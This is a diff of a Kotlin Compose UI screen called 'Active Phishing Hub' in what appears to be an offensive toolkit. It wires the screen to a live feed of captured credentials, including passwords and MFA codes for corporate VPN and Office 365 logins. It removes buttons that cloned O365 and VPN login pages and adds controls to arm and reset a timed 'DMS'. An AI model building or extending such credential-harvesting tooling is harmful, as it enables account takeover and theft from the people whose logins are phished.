@@ -17,10 +17,7 @@ import com.spartanai.nova.core.NovaOrchestrator
 fun PhishingScreen() {
     val orchestrator = NovaOrchestrator.getInstance()
     var isServerActive by remember { mutableStateOf(false) }
-    val capturedData = listOf(
-        "USER: admin | PASS: p@ssword123 | TARGET: Corporate VPN",
-        "USER: target@corp.com | MFA: 554321 | TARGET: O365"
-    )
+    val capturedData by orchestrator.capturedCredentials.collectAsState()
 
     Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
         Text("Active Phishing Hub", style = MaterialTheme.typography.headlineMedium)
@@ -62,17 +59,23 @@ fun PhishingScreen() {
                     )
                 }
             }
+            if (capturedData.isEmpty()) {
+                item {
+                    Text("Waiting for connection...", color = Color.Gray, modifier = Modifier.padding(16.dp))
+                }
+            }
         }
 
         Spacer(modifier = Modifier.height(16.dp))
 
         Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceEvenly) {
-            Button(onClick = { orchestrator.executeCommand("phish clone-o365") }) {
-                Text("CLONE O365")
+            Button(onClick = { orchestrator.armDMS(5) }) {
+                Text("ARM DMS (5m)")
             }
-            Button(onClick = { orchestrator.executeCommand("phish clone-vpn") }) {
-                Text("CLONE VPN")
+            Button(onClick = { orchestrator.resetDMS() }) {
+                Text("RESET DMS")
             }
         }
+
     }
 }
